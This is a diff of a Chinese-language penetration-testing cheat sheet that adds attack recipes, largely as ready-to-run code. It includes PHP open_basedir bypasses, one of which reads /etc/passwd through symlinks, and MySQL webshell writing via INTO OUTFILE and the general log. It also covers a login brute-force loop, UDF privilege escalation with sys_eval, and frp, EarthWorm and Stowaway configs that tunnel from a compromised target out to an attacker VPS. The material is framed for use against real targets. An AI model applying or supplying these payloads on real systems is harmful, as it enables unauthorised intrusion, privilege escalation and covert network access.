@@ -267,182 +267,316 @@ ls xxx.yyy.cn #列出域信息
 * searchcode :https://searchcode.com/
 * greynoise :https://greynoise.io/
 
-## 进入内网 
+## 外网穿透
 
-### 基于企业弱账号漏洞 
+### 绕过open_basedir
 
-* VPN（通过邮箱，密码爆破，社工等途径获取VPN） 
-* 企业相关运维系统（zabbix等） 
+1. ini_set绕过
 
-### 基于系统漏洞进入 
-* Metasploit(漏洞利用框架):https://github.com/rapid7/metasploit-framework 
-* 漏洞利用脚本 
+```
+mkdir('img');
+chdir('img');
+ini_set('open_basedir','..');
+chdir('..');
+chdir('..');
+chdir('..');
+chdir('..');
+chdir('..');
+chdir('..');
+chdir('..');
+ini_set('open_basedir','/');
+```
 
-### 网站应用程序渗透 
-* SQL注入 
-* 跨站脚本（XSS） 
-* 跨站请求伪造（CSRF） 
-* SSRF（[ssrf_proxy](https://github.com/bcoles/ssrf_proxy)） 
-* 功能/业务逻辑漏洞 
-* 其他漏洞等 
-* CMS-内容管理系统漏洞 
-* 企业自建代理 
+2. 系统命令执行绕过
 
-### 无线Wi-Fi接入 
+   system("cd /;ls")
 
-## 隐匿攻击 
+3. glob://伪协议绕过
 
-### Command and Control  
-* ICMP :https://pentestlab.blog/2017/07/28/command-and-control-icmp/
-* DNS :https://pentestlab.blog/2017/09/06/command-and-control-dns/
-* DropBox :https://pentestlab.blog/2017/08/29/command-and-control-dropbox/
-* Gmail :https://pentestlab.blog/2017/08/03/command-and-control-gmail/
-* Telegram :http://drops.xmd5.com/static/drops/tips-16142.html
-* Twitter :https://pentestlab.blog/2017/09/26/command-and-control-twitter/
-* Website Keyword :https://pentestlab.blog/2017/09/14/command-and-control-website-keyword/
-* PowerShell :https://pentestlab.blog/2017/08/19/command-and-control-powershell/
-* Windows COM :https://pentestlab.blog/2017/09/01/command-and-control-windows-com/
-* WebDAV :https://pentestlab.blog/2017/09/12/command-and-control-webdav/
-* Office 365 :https://www.anquanke.com/post/id/86974
-* HTTPS :https://pentestlab.blog/2017/10/04/command-and-control-https/
-* Kernel :https://pentestlab.blog/2017/10/02/command-and-control-kernel/
-* Website :https://pentestlab.blog/2017/11/14/command-and-control-website/
-* WMI :https://pentestlab.blog/2017/11/20/command-and-control-wmi/
-* WebSocket :https://pentestlab.blog/2017/12/06/command-and-control-websocket/
-* Images :https://pentestlab.blog/2018/01/02/command-and-control-images/
-* Web Interface :https://pentestlab.blog/2018/01/03/command-and-control-web-interface/
-* JavaScript :https://pentestlab.blog/2018/01/08/command-and-control-javascript/
-*  ... 
+   ```
+   <?php
+   // 循环 ext/spl/examples/ 目录里所有 *.php 文件
+   // 并打印文件名和文件尺寸
+   $it = new DirectoryIterator("glob://ext/spl/examples/*.php");
+   foreach($it as $f) {
+       printf("%s: %.1FK\n", $f->getFilename(), $f->getSize()/1024);
+   }
+   ?>
+   
+   <?php
+   $a = new DirectoryIterator("glob:///*");
+   foreach($a as $f){
+       echo($f->__toString().'<br>');
+   }
+   ?>
+   
+   <?php
+   var_dump(scandir('glob:///*'));
+   >
+   
+   <?php
+   if ( $b = opendir('glob:///*') ) {
+       while ( ($file = readdir($b)) !== false ) {
+           echo $file."<br>";
+       }
+       closedir($b);
+   }
+   ?>
+   ```
 
-### Fronting 
+4. symlink函数绕过
+
+   symlink()对于已有的target建立一个名为link的符号连接。
+
+   ```
+   读取/etc/passwd
+   <?php
+   mkdir("a");
+   chdir("a");
+   mkdir("b");
+   chdir("b");
+   mkdir("c");
+   chdir("c");
+   mkdir("d");
+   chdir("d");
+   chdir("..");
+   chdir("..");
+   chdir("..");
+   chdir("..");
+   symlink("a/b/c/d","Von");
+   symlink("Von/../../../../etc/passwd","exp");
+   unlink("Von");
+   mkdir("Von");
+   system('cat exp');
+   ```
+
+5. 还有一些鸡肋的[办法](https://www.v0n.top/2020/07/10/open_basedir%E7%BB%95%E8%BF%87/)
+
+   
+
+### 绕过disable_function
+
+1. 蚁剑插件
+
+2. https://mp.weixin.qq.com/s?__biz=MzU3ODc2NTg1OA==&mid=2247485666&idx=1&sn=71a0cce05637edd488cb9cccb3967504
+
+   直接把php脚本传上去，然后传参就可以执行命令，不过是无回显的，这样弹回的shell有时是一次性的，连上执行不了命令，解决办法是用stowaway
+
+参考：https://blog.z3ratu1.cn/%E4%BB%8EByteCTF%E5%88%B0bypass_disable_function.html
+
+​			https://www.cnblogs.com/sakura521/p/15055907.html
+
+
+
+### Mysql 拿shell
+
+```
+写文件
+show global variables like '%secure_file_priv%';
+select '<?php phpinfo(); ?>' into outfile '/var/www/html/info.php';
+sqlmap -u "http://x.x.x.x/?id=x" --file-write="/Users/guang/Desktop/shell.php" --file-dest="/var/www/html/test/shell.php"
+
+日志拿shell
+SHOW VARIABLES LIKE 'general%';
+# 更改日志文件位置
+set global general_log = "ON";
+set global general_log_file='/var/www/html/info.php';
+select '<?php phpinfo();?>';
+
+知道用户名多次密码错误有几率登陆
+for i in `seq 1 1000`; do mysql -uroot -pwrong -h 127.0.0.1 -P3306 ; done
+
+UDF提权
+动态库下载：https://sqlsec.lanzoux.com/i4b7jhyhwid
+查看插件目录
+show variables like '%plugin%';
+select @@basedir;
+没有的话创建：
+select 233 into dumpfile 'C:\\PhpStudy\\PHPTutorial\\MySQL\\lib\\plugin::$index_allocation';
+写入动态链接库
+sqlmap -u "http://localhost:30008/" --data="id=1" --file-write="/Users/sec/Desktop/lib_mysqludf_sys_64.so" --file-dest="/usr/lib/mysql/plugin/udf.so"
+创建函数
+CREATE FUNCTION sys_eval RETURNS STRING SONAME 'udf.dll';
+select * from mysql.func;
+select sys_eval('whoami');
+drop function sys_eval;
+```
+
+[t00ls UDF.PHP](https://github.com/echohun/tools/blob/master/大马/udf.php)   网页脚本，一键UDF
+
+[参考](https://www.sqlsec.com/2020/11/mysql.html#toc-heading-31)
+
+
+
+
+
+### 域前置
+
 * [Domain Fronting ](https://evi1cg.me/archives/Domain_Fronting.html)
 * [Tor_Fronting.](https://evi1cg.me/archives/Tor_Fronting.html)
-  
-### 代理 
+### 代理搭建
 * VPN 
+
 * shadowsockts :https://github.com/shadowsocks
+
 * HTTP :http://cn-proxy.com/
+
 * Tor
+
 * [Venom](https://github.com/Dliv3/Venom) -- 但是不支持UDP流量
+
 * [Stowaway](https://github.com/ph4ntonn/Stowaway) -- 支持UDP流量，稳定性好
+
+  ```
+  admin: ./stowaway_admin -l 9999
+  agent: ./stowaway_agent -c 127.0.0.1:9999 --reconnect 10
+  ```
+
 * [nps](https://github.com/ehang-io/nps)
 
-### 代理的使用
+* [frp](https://github.com/fatedier/frp)
+
+  ```
+  VPS配置：
+  [common]
+  bind_addr = 0.0.0.0
+  bind_port = 7000
+  token = test
+  #port，token自定义 保持客户端与服务端一致即可
+  
+  web界面
+  # dashboard_addr = 0.0.0.0 
+  # 端口必须设置，只有设置web页面才生效
+  dashboard_port = 7500
+  # 用户密码
+  dashboard_user = admin1
+  dashboard_pwd = hadaessd@@@!!@@#
+  # 允许客户端绑定的端口
+  allow_ports = 40000-50000
+  
+  启动服务端：
+  nohup ./frps -c frps.ini &
+  
+  
+  目标机上配置：
+  #编辑frpc.ini内容如下，与frpc一并上传到服务器
+  # chmod +x frpc(最好将其改个名，比如deamon）
+  [common]
+  server_addr = xxx.xxx.xx.xxx
+  # port，token保持一致
+  server_port = 7000
+  token = test
+  tls_enable = true
+  pool_count = 5
+  
+  #http协议代理
+  [plugin_http_proxy]
+  type = tcp
+  remote_port = 7890
+  plugin = http_proxy
+  # 可以添加认证
+  # plugin_http_user = abc
+  # plugin_http_passwd = abc
+  
+  #socks5协议代理
+  [plugin_socks5]
+  type = tcp
+  remote_port = 7891
+  plugin = socks5
+  # plugin_user = abc
+  # plugin_passwd = abc
+  use_encryption = true
+  use_compression = true
+  ```
+
+- [frpModify](https://github.com/uknowsec/frpModify) -> 修改之后支持域前置以及自删除
+
 * proxychain `proxychain4 -q bash #终端全局代理`
 
-## 内网跨边界应用 
+* Neo-reGeorg : https://github.com/L-codes/Neo-reGeorg
 
-### 内网跨边界转发 
+  ```
+  python3 neoreg.py -k password -u http://xx/tunnel.php
+  ```
+
+- [chisel](https://github.com/jpillora/chisel)--文章介绍[《Red Team: Using SharpChisel to exfil internal network》](https://medium.com/@shantanukhande/red-team-using-sharpchisel-to-exfil-internal-network-e1b07ed9b49)
+
+- [SharpChisel](https://github.com/shantanu561993/SharpChisel)--chisel的c#封装版本
+
+- [mssqlproxy](https://github.com/blackarrowsec/mssqlproxy)--利用mssql执行clr作为传输通道(当目标机器只开放mssql时)
+
+- [ligolo](https://github.com/FunnyWolf/ligolo) -- 轻量级的反向Socks5代理工具,所有的流量使用TLS加密
+
 * [NC端口转发](https://blog.csdn.net/l_f0rm4t3d/article/details/24004555) 
+
 * [LCX端口转发 ](http://blog.chinaunix.net/uid-53401-id-4407931.html)
+
 * [nps](https://github.com/cnlh/nps) -> 个人用觉得比较稳定 ～
-* [frp](https://github.com/fatedier/frp)
-```
-socks5环境VPS配置：
 
-[common]
-bind_addr = 0.0.0.0
-bind_port = 7000
+* [Tunna ](https://github.com/SECFORCE/Tunna)
 
+* [Reduh ](https://github.com/sensepost/reDuh)
 
-#其实可以不配置下面这些,web界面只会消耗内存
-# IP 与 bind_addr 默认相同，可以不设置
-# dashboard_addr = 0.0.0.0 
-# 端口必须设置，只有设置web页面才生效
-dashboard_port = 7500
-# 用户密码保平安
-dashboard_user = admin1
-dashboard_pwd = hadaessd@@@!!@@#
-# 允许客户端绑定的端口
-allow_ports = 40000-50000
- 
-启动服务端：
-
-nohup ./frps -c frps.ini &
-```
-
-```
-目标机上配置：
-
-#编辑frpc.ini内容如下，与frpc一并上传到服务器
-# chmod +x frpc(最好将其改个名，比如deamon）
-[common]
-#remote vps addr
-server_addr = your vps addr
-#端口自选
-server_port = 7000    
-tls_enable = true
-pool_count = 5
-
-[plugin_socks]
-type = tcp
-remote_port = 46075
-plugin = socks5
-plugin_user = admin
-plugin_passwd = password
-use_encryption = true
-use_compression = true
-```
-
-* [frpModify](https://github.com/uknowsec/frpModify) -> 修改之后支持域前置以及自删除
-* 代理脚本 
-    1. [Tunna ](https://github.com/SECFORCE/Tunna)
-    2. [Reduh ](https://github.com/sensepost/reDuh)
 * [pystinger](https://github.com/FunnyWolf/pystinger) -> 毒刺(pystinger)通过webshell实现内网SOCK4代理,端口映射.
-* ... 
-  
-### 内网跨边界代理穿透 
-#### [EW](https://rootkiter.com/EarthWorm/) 
-正向 SOCKS v5 服务器:
-```
-./ew -s ssocksd -l 1080
-```
- 反弹 SOCKS v5 服务器:
-a) 先在一台具有公网 ip 的主机A上运行以下命令：
-```
-$ ./ew -s rcsocks -l 1080 -e 8888 
 
-```
-b) 在目标主机B上启动 SOCKS v5 服务 并反弹到公网主机的 8888端口
-```
-$ ./ew -s rssocks -d 1.1.1.1 -e 8888 
-```
-多级级联
-```
-$ ./ew -s lcx_listen -l 1080 -e 8888
-$ ./ew -s lcx_tran -l 1080 -f 2.2.2.3 -g 9999
-$ ./ew -s lcx_slave -d 1.1.1.1 -e 8888 -f 2.2.2.3 -g 9999
-```
-lcx_tran 的用法
-```
-$ ./ew -s ssocksd -l 9999
-$ ./ew -s lcx_tran -l 1080 -f 127.0.0.1 -g 9999
-```
-lcx_listen. lcx_slave 的用法
-```
-$ ./ew -s lcx_listen -l 1080 -e 8888
-$ ./ew -s ssocksd -l 9999
-$ ./ew -s lcx_slave -d 127.0.0.1 -e 8888 -f 127.0.0.1 -g 9999
-```
-“三级级联”的本地SOCKS测试用例以供参考
-```
-$ ./ew -s rcsocks -l 1080 -e 8888
-$ ./ew -s lcx_slave -d 127.0.0.1 -e 8888 -f 127.0.0.1 -g 9999
-$ ./ew -s lcx_listen -l 9999 -e 7777
-$ ./ew -s rssocks -d 127.0.0.1 -e 7777
-```
-#### [Termite](https://rootkiter.com/Termite/) 
-使用说明:https://rootkiter.com/Termite/README.txt 
-#### 代理脚本 
-Neo-reGeorg : https://github.com/L-codes/Neo-reGeorg
-### 内网隧道建立
-[chisel](https://github.com/jpillora/chisel)--文章介绍[《Red Team: Using SharpChisel to exfil internal network》](https://medium.com/@shantanukhande/red-team-using-sharpchisel-to-exfil-internal-network-e1b07ed9b49)
+* [EW](https://rootkiter.com/EarthWorm/) 
 
-[SharpChisel](https://github.com/shantanu561993/SharpChisel)--chisel的c#封装版本
+    正向 SOCKS v5 服务器:
 
-[mssqlproxy](https://github.com/blackarrowsec/mssqlproxy)--利用mssql执行clr作为传输通道(当目标机器只开放mssql时)
+    ```
+    ./ew -s ssocksd -l 1080
+    ```
 
-[ligolo](https://github.com/FunnyWolf/ligolo) -- 轻量级的反向Socks5代理工具,所有的流量使用TLS加密
+     反弹 SOCKS v5 服务器:
+    a) 先在一台具有公网 ip 的主机A上运行以下命令：
+
+    ```
+    $ ./ew -s rcsocks -l 1080 -e 8888 
+    
+    ```
+
+    b) 在目标主机B上启动 SOCKS v5 服务 并反弹到公网主机的 8888端口
+
+    ```
+    $ ./ew -s rssocks -d 1.1.1.1 -e 8888 
+    ```
+
+    多级级联
+
+    ```
+    $ ./ew -s lcx_listen -l 1080 -e 8888
+    $ ./ew -s lcx_tran -l 1080 -f 2.2.2.3 -g 9999
+    $ ./ew -s lcx_slave -d 1.1.1.1 -e 8888 -f 2.2.2.3 -g 9999
+    ```
+
+    lcx_tran 的用法
+
+    ```
+    $ ./ew -s ssocksd -l 9999
+    $ ./ew -s lcx_tran -l 1080 -f 127.0.0.1 -g 9999
+    ```
+
+    lcx_listen. lcx_slave 的用法
+
+    ```
+    $ ./ew -s lcx_listen -l 1080 -e 8888
+    $ ./ew -s ssocksd -l 9999
+    $ ./ew -s lcx_slave -d 127.0.0.1 -e 8888 -f 127.0.0.1 -g 9999
+    ```
+
+    “三级级联”的本地SOCKS测试用例以供参考
+
+    ```
+    $ ./ew -s rcsocks -l 1080 -e 8888
+    $ ./ew -s lcx_slave -d 127.0.0.1 -e 8888 -f 127.0.0.1 -g 9999
+    $ ./ew -s lcx_listen -l 9999 -e 7777
+    $ ./ew -s rssocks -d 127.0.0.1 -e 7777
+    ```
+
+- [Termite](https://rootkiter.com/Termite/)   使用说明:https://rootkiter.com/Termite/README.txt 
+
+    
+
 
 ### shell反弹 
 bash  
@@ -787,6 +921,8 @@ SimpleHTTPserver -- golang实现
 simplehttpserver
 ```
 
+
+
 ## 内网信息搜集 
 
 ### 本机信息搜集
@@ -1040,6 +1176,7 @@ Linux 下 openssh 后门
 ##### 2. 常用的存储Payload位置 
 **WMI** :
 存储：
+
 ```
 $StaticClass = New-Object Management.ManagementClass('root\cimv2', $null,$null)
 $StaticClass.Name = 'Win32_Command'
@@ -1733,6 +1870,7 @@ http://www.vuln.cn/6812
 * [BloodHound ](https://github.com/BloodHoundAD/BloodHound)
 * [CrackMapExec ](https://github.com/byt3bl33d3r/CrackMapExec)
 * [DeathStar](https://github.com/byt3bl33d3r/DeathStar) 
+  
   >利用过程：http://www.freebuf.com/sectool/160884.html 
 
 ### 在远程系统上执行程序 
